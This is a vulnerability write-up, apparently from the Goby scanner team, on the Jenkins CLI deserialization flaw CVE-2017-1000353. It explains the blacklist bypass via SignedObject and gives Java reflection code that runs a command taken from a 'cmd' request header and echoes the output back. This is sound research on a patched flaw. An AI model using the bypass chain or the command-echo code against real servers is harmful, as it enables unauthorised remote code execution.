# 0x01 Background

Recently, we organized a Goby vulnerability challenge event, and during the event, we received a lot of feedback. This feedback raised a series of issues regarding incomplete consideration of scenarios when writing POC vulnerability detection and exploitation. To address these issues, we conducted a comparative analysis using commonly available tools in the market, and we discovered that these tools generally suffer from homogeneity problems in terms of vulnerability detection principles and exploitation processes. They fail to fully consider the diversity of the actual testing environment, including issues such as vulnerabilities without any output, target machines that are not connected to the internet, poor system compatibility (Windows, Linux), and low compatibility with different product versions.

In this article, we take the Jenkins deserialization vulnerability as an optimization case study to share our approach in addressing vulnerability issues. First, users reported an issue with the inability to exploit the Jenkins vulnerability. During the vulnerability analysis process, we found that the previous exploit relied on a specific JAR file, which Goby did not have integrated, resulting in the inability to exploit the vulnerability. Reintroducing this JAR file into Goby would make the program bloated, and this exploitation method lacks the desired echo effect, which is not in line with Goby's standards of simplicity, efficiency, high compatibility with multiple versions, and direct echo effect for vulnerabilities. Therefore, by analyzing the relevant materials of CVE-2017-1000353 and studying Jenkins' echo functionality, we ultimately achieved high version compatibility, one-click command execution, and reverse shell effect on Goby. This made the vulnerability exploitation process more concise, intuitive, and efficient.



| Tool/Feature         | Before Modification              | After Modification          |
| -------------------- | -------------------------------- | --------------------------- |
| Command Execution    | Supported                        | Supported                   |
| Command Echo         | Not supported                    | Supported                   |
| Exploitation Process | Third-party tool sending packets | One-click command execution |
| Dependency           | Third-party JAR file             | Not required                |
| Convenience          | Simple operation                 | Simple operation            |

# 0x02 Vulnerability Analysis

Jenkins CLI Serialization Code Execution Vulnerability (CVE-2017-1000353) occurs within the CLI interface. When the server processes a "download" request, it invokes the "download()" method and waits for an "upload" request. Upon receiving the "upload" request, the request content is passed as an input stream to the created "Channel" object. During the creation of the "Channel" object, a sub-thread is created to read the serialized object, which triggers the deserialization vulnerability by calling the "readObject()" method.

The vulnerability is present in the handling of response information within the CLI interface. When the value of the "Side" in the HTTP request header is set to "download", the request information is processed using the `server.download(req, rsp)` method.

```java
private class CliEndpointResponse extends HttpResponseException {
  @Override
  public void generateResponse(StaplerRequest req, StaplerResponse rsp, Object node) throws IOException, ServletException {
    try {
      UUID uuid = UUID.fromString(req.getHeader("Session"));
      rsp.setHeader("Hudson-Duplex","");
      FullDuplexHttpChannel server;
      if(req.getHeader("Side").equals("download")) {
				......
        try {
          server.download(req,rsp);
        } finally {
          duplexChannels.remove(uuid);
        }
      } else {
        duplexChannels.get(uuid).upload(req,rsp);
      }
    } catch (InterruptedException e) {......}
  }
}
```

In the `download()` method of the class, it first suspends  and waits for the successful reception of the "upload" request. Once  content is read from the "upload" request, a `Channel` object is created, and the content of the "upload" request is passed into it. Multiple `this` calls are made within the `Channel` object.

```java
public synchronized void download(StaplerRequest req, StaplerResponse rsp) throws InterruptedException, IOException {
  ......
  try {
      channel = new Channel("HTTP full-duplex channel " + uuid,
      Computer.threadPoolForRemoting, Mode.BINARY, upload, out, null, restricted);
  ......
  } finally {......}
}
```

After a series of `this` calls within the `Channel()` constructor, the `transport.setup()` method is eventually invoked.

```java
@Deprecated
public Channel(String name, ExecutorService exec, Mode mode, InputStream is, OutputStream os, OutputStream header, boolean restricted) throws IOException {
  this(name,exec,mode,is,os,header,restricted,null);
}
  ......
protected Channel(ChannelBuilder settings, CommandTransport transport) throws IOException {
  ......
	transport.setup(this, new CommandReceiver() {
        public void handle(Command cmd) {
            commandsReceived++;
            lastCommandReceivedAt = System.currentTimeMillis();
            if (logger.isLoggable(Level.FINE))
                logger.fine("Received " + cmd);
            try {
                cmd.execute(Channel.this);
            } catch (Throwable t) {
                logger.log(Level.SEVERE, "Failed to execute command " + cmd + " (channel " + Channel.this.name + ")", t);
                logger.log(Level.SEVERE, "This command is created here", cmd.createdAt);
            }
        }
    ......
    });
    ACTIVE_CHANNELS.put(this,ref());
}
```

In the `setup()` method, a child thread is created using `new ReaderThread(receiver).start();`.

```java
@Override
public void setup(Channel channel, CommandReceiver receiver) {
    this.channel = channel;
    new ReaderThread(receiver).start();
}
```

Within the thread, the `read()` method of the `ClassicCommandTransport` class is called.

```java
@Override
public void run() {
    final String name =channel.getName();
    try {
        while(!channel.isInClosed()) {
            Command cmd = null;
            try {
                cmd = read();
            } catch (SocketTimeoutException ex) {
                if (RDR_FAIL_ON_SOCKET_TIMEOUT) {
                    LOGGER.log(Level.SEVERE, "Socket timeout in the Synchronous channel reader."
                            + " The channel will be interrupted, because " + RDR_SOCKET_TIMEOUT_PROPERTY_NAME 
                            + " is set", ex);
                    throw ex;
                }
            }
            ......
        }
    }
}
```

This method includes the `readFrom()` method of the `Command` class, which performs the `readObject()` operation on the incoming byte stream, thereby causing deserialization code execution.

```java
public final Command read() throws IOException, ClassNotFoundException {
    try {
        Command cmd = Command.readFrom(channel, ois);
        if (rawIn!=null)
            rawIn.clear();
        return cmd;
    } catch (RuntimeException e) {// see JENKINS-19046
        throw diagnoseStreamCorruption(e);
    } catch (StreamCorruptedException e) {
        throw diagnoseStreamCorruption(e);
    }
}
```

```java
static Command readFrom(Channel channel, ObjectInputStream ois) throws IOException, ClassNotFoundException {
  Channel old = Channel.setCurrent(channel);
  try {
    return (Command)ois.readObject();
  } finally {
    Channel.setCurrent(old);
  }
}
```

# 0x03 Exploitation of the vulnerability

After analyzing the cause of the vulnerability, we need to consider how  to construct a payload to exploit it. Since Jenkins includes the `org.apache.commons.collections` dependency, we can attempt to use a CC (Commons Collections) gadget  chain for the deserialization attack. However, Jenkins has blacklisted  direct deserialization of CC gadget chains, which means we need to find a chain that can bypass the blacklist restrictions.

## 3.1 Serialization Blacklist

In the vulnerability analysis section, it was mentioned that the `Channel()` method undergoes a series of `this` calls, during which the `negotiate()` method of the `ChannelBuilder` class is invoked. In the `negotiate()` method, there is a call to `makeTransport()` before returning. This method returns a `ClassicCommandTransport` object. During the creation of this object, an `ObjectInputStreamEx` object is created, and the `getClassFilter()` method of this class is invoked during the parameter passing. The `getClassFilter()` method returns `ClassFilter.DEFAULT`, which ultimately provides a predefined blacklist of classes. This  blacklist includes the relevant classes from the CC (Commons  Collections) gadget chain.

```java
private static final String[] DEFAULT_PATTERNS = {
    "^bsh[.].*",
    "^com[.]google[.]inject[.].*",
    "^com[.]mchange[.]v2[.]c3p0[.].*",
    "^com[.]sun[.]jndi[.].*",
    "^com[.]sun[.]corba[.].*",
    "^com[.]sun[.]javafx[.].*",
    "^com[.]sun[.]org[.]apache[.]regex[.]internal[.].*",
    "^java[.]awt[.].*",
    "^java[.]rmi[.].*",
    "^javax[.]management[.].*",
    "^javax[.]naming[.].*",
    "^javax[.]script[.].*",
    "^javax[.]swing[.].*",
    "^org[.]apache[.]commons[.]beanutils[.].*",
    "^org[.]apache[.]commons[.]collections[.]functors[.].*",
    "^org[.]apache[.]myfaces[.].*",
    "^org[.]apache[.]wicket[.].*",
    ".*org[.]apache[.]xalan.*",
    "^org[.]codehaus[.]groovy[.]runtime[.].*",
    "^org[.]hibernate[.].*",
    "^org[.]python[.].*",
    "^org[.]springframework[.](?!(\\p{Alnum}+[.])*\\p{Alnum}*Exception$).*",
    "^sun[.]rmi[.].*",
    "^javax[.]imageio[.].*",
    "^java[.]util[.]ServiceLoader$",
    "^java[.]net[.]URLClassLoader$"
};
```

## 3.2 Bypassing the Blacklist

The blacklist in Jenkins restricts the usage of classes related to CC (Commons Collections) gadget chain exploitation. However, the `SignedObject` class is not included in the blacklist. The `SignedObject` class allows the creation of objects by passing a serialized object as a parameter. Additionally, the `getObject()` method of the `SignedObject` class performs deserialization on the passed serialized object by invoking the `readObject()` method. Notably, the `readObject()` method does not impose restrictions on the usage of CC classes. This enables the injection of a constructed serialized object for malicious code execution during deserialization.

Therefore, it becomes necessary to construct an exploitation chain that invokes the `getObject()` method of the `SignedObject` class. By doing so, it is possible to bypass the blacklist restrictions on the CC gadget chain and carry out the deserialization attack.

## 3.3 Process of Bypassing CC Gadget Chain Exploitation

[![pCdbl8O.png](https://s1.ax1x.com/2023/06/28/pCdbl8O.png)](https://imgse.com/i/pCdbl8O)

## 3.4 Payload Analysis 

When deserializing the `ReferenceMap` class, its `readObject` method is called by default.

[![pCdb3xe.png](https://s1.ax1x.com/2023/06/28/pCdb3xe.png)](https://imgse.com/i/pCdb3xe)

The `doReadObject` method reads the serialized stream, assigns the values to the `key` and `value` variables, and then calls the `put` method to add them to a map.

[![pCdbGKH.png](https://s1.ax1x.com/2023/06/28/pCdbGKH.png)](https://imgse.com/i/pCdbGKH)

[![pCdbJrd.png](https://s1.ax1x.com/2023/06/28/pCdbJrd.png)](https://imgse.com/i/pCdbJrd)

In the `put` method, the `isEqualKey` method is called to compare the two keys that are passed in.

[![pCdbYqA.png](https://s1.ax1x.com/2023/06/28/pCdbYqA.png)](https://imgse.com/i/pCdbYqA)

Since the key being passed in is a `CopyOnWriteArraySet` object, the `equals` method of that object is invoked.

[![pCdbyrj.png](https://s1.ax1x.com/2023/06/28/pCdbyrj.png)](https://imgse.com/i/pCdbyrj)

In the `CopyOnWriteArraySet.equals()` method, the `eq()` method is called to determine whether the two objects passed in are equal.

[![pCdbgZn.png](https://s1.ax1x.com/2023/06/28/pCdbgZn.png)](https://imgse.com/i/pCdbgZn)

[![pCdb2aq.png](https://s1.ax1x.com/2023/06/28/pCdb2aq.png)](https://imgse.com/i/pCdb2aq)

In the `equals` method of handling `CopyOnWriteArraySet`, the `equals` method of the `ConcurrentSkipListSet` object, which is wrapped by `CopyOnWriteArraySet`, is called with the `ListOrderedSet` object being passed as an argument.

[![pCdbfiV.png](https://s1.ax1x.com/2023/06/28/pCdbfiV.png)](https://imgse.com/i/pCdbfiV)

In the payload, the `collection` of the `ListOrderedSet` object is replaced with a `JSONArray` object. As a result, when the `containsAll` method is called, it invokes the `containsAll` method of the `JSONArray` class to process the passed `ConcurrentSkipListSet` object.

[![pC0bMGV.png](https://s1.ax1x.com/2023/06/30/pC0bMGV.png)](https://imgse.com/i/pC0bMGV)

After that, the elements are iterated through an internal method within the `JSONArray` class. When an element is an object, it is converted to a JSON object, and the `PropertyUtils.getProperty()` method is used to retrieve its property value. During the process of obtaining the property value, the `getObject()` method of the `SignedObject` object is invoked using reflection, which serves as the entry point for the CC gadget chain.

[![pCdb4RU.png](https://s1.ax1x.com/2023/06/28/pCdb4RU.png)](https://imgse.com/i/pCdb4RU)

```
 *   JSONArray.containsAll() ->
 *    JSONArray.containsAll() ->
 *     JSONArray.fromObject() ->
 *      JSONArray._fromCollection() ->
 *       JSONArray.addValue() ->
 *        JSONArray.processValue() ->
 *         JSONArray._processValue() ->
 *          AbstractJSON._processValue() ->
 *           JSONObject.fromObject() ->
 *            JSONObject._fromBean() ->
 *             JSONObject.defaultBeanProcessing() ->
 *              PropertyUtils.getProperty() ->
 *               PropertyUtilsBean.getProperty() ->
 *                PropertyUtilsBean.getNestedProperty() ->
 *                 PropertyUtilsBean.getSimpleProperty() ->
 *                  PropertyUtilsBean.invokeMethod() ->
 *                   SignedObject.getObject() ->
```

## 3.5 SignedObject class

In the constructor of the `SignedObject` class, a `Serializable` object is passed as a parameter. It is serialized and stored in the `content` property. In the `getObject()` method of `SignedObject`, the `content` is deserialized.

[![pCdb5zF.png](https://s1.ax1x.com/2023/06/28/pCdb5zF.png)](https://imgse.com/i/pCdb5zF)

[![pCdboM4.png](https://s1.ax1x.com/2023/06/28/pCdboM4.png)](https://imgse.com/i/pCdboM4)

## 3.6 Vulnerability Fix 

The official fix involves adding the `SignedObject` class to the blacklist.

[![pCdbbZR.png](https://s1.ax1x.com/2023/06/28/pCdbbZR.png)](https://imgse.com/i/pCdbbZR)

 # 0x04 Exploitation for Command Execution and Output Retrieval 

After bypassing the restrictions of the CC chain blacklist, we need to consider how to effectively exploit the vulnerability. Many mainstream tools, such as vulhub, provide exploitation methods using jar files to generate serialized objects for executing system commands. However, this approach can be cumbersome and may not efficiently demonstrate the exploitation effect.

In the case of Jenkins, its HTTP request and servlet handling are based on the Jetty server implementation. The Jetty Echo servlet [jetty789Echo.jsp](https://github.com/feihong-cs/Java-Rce-Echo/blob/master/Jetty/code/jetty789Echo.jsp) provides two methods for outputting information in Jetty. Since the CVE-2017-1000353 vulnerability creates a channel during exploitation and passes the download and upload types of HTTP requests into it, we can leverage reflection to access the `channel` object's `http` property. By extracting certain fields from the HTTP request headers, we can read and execute the provided command, and write the execution results into the response packet, thereby completing the entire echo process.

Reflection to access the `underlyingOutput` property in the `channel` object.

```java
Field underlyingOutputField = channel.getClass().getDeclaredField("underlyingOutput");
underlyingOutputField.setAccessible(true);
Object underlyingOutput = underlyingOutputField.get(channel);
Object httpConnection;
```

Accessing `underlyingOutput` property, both `_channel` and `this$0` attributes store relevant information about the HTTP request response.  By utilizing reflection, we can retrieve the attributes of `_channel` and `this$0` and assign them to the `httpConnection` object.

```java
try{
  Field _channelField = underlyingOutput.getClass().getDeclaredField("_channel");
  _channelField.setAccessible(true);
  httpConnection = _channelField.get(underlyingOutput);
  	}catch (Exception e){
  Field connectionField = underlyingOutput.getClass().getDeclaredField("this$0");
  connectionField.setAccessible(true);
  httpConnection = connectionField.get(underlyingOutput);
}
```

After obtaining the HTTP information, you can use reflection to retrieve the value of the `cmd` field in the request header. Then, you can execute the command and write the output to the response.

```java
Object request = httpConnection.getClass().getMethod("getRequest").invoke(httpConnection);
Object response = httpConnection.getClass().getMethod("getResponse").invoke(httpConnection);
String cmd = (String) request.getClass().getMethod("getHeader", String.class).invoke(request, "cmd");
OutputStream outputStream = (OutputStream)response.getClass().getMethod("getOutputStream").invoke(response);
String result = "\n"+exec(cmd);
outputStream.write(result.getBytes());
outputStream.flush();
```

[![pCdbXi6.png](https://s1.ax1x.com/2023/06/28/pCdbXi6.png)](https://imgse.com/i/pCdbXi6)

These techniques are integrated into Goby, allowing users to experience  the one-click command execution and shell reverse functionality for the  CVE-2017-1000353 vulnerability.

[![](https://res.cloudinary.com/marcomontalbano/image/upload/v1687945459/video_to_markdown/images/youtube--UEIl-m4Rkxs-c05b58ac6eb4c4700831b2b3070cd403.jpg)](https://youtu.be/UEIl-m4Rkxs "")

# 0x05 Effect Comparison

| Tool/Feature           | Goby                        | CVE-2017-1000353-SNAPSHOT-all.jar                            |
| ---------------------- | --------------------------- | ------------------------------------------------------------ |
| Execution of Commands  | Supported                   | Supported                                                    |
| Command Echo           | Supported                   | Not supported                                                |
| Exploitation Process   | One-click command execution | Manual generation of serialized payload and script execution |
| Dependency Environment | Not required                | Requires Java and Python                                     |
| Convenience            | Easy operation              | Complex operation                                            |



# 0x06 Reference

[https://github.com/vulhub/CVE-2017-1000353](https://github.com/vulhub/CVE-2017-1000353)

[https://github.com/r00t4dm/Jenkins-CVE-2017-1000353](https://github.com/r00t4dm/Jenkins-CVE-2017-1000353)

[https://paper.seebug.org/295/](https://paper.seebug.org/295/)

[https://github.com/feihong-cs/Java-Rce-Echo](https://github.com/feihong-cs/Java-Rce-Echo)

<br/>

<br/>

[Goby Official URL](https://gobies.org/)

If you have a functional type of issue, you can raise an issue on GitHub or in the discussion group below:

1. GitHub issue: https://github.com/gobysec/Goby/issues
2. Telegram Group: http://t.me/gobies (Community advantage: Stay updated with the latest information about Goby features, events, and other announcements in real-time.) 
3. Telegram Channel: https://t.me/joinchat/ENkApMqOonRhZjFl 
4. Twitterï¼š[https://twitter.com/GobySec](https://twitter.com/GobySec)
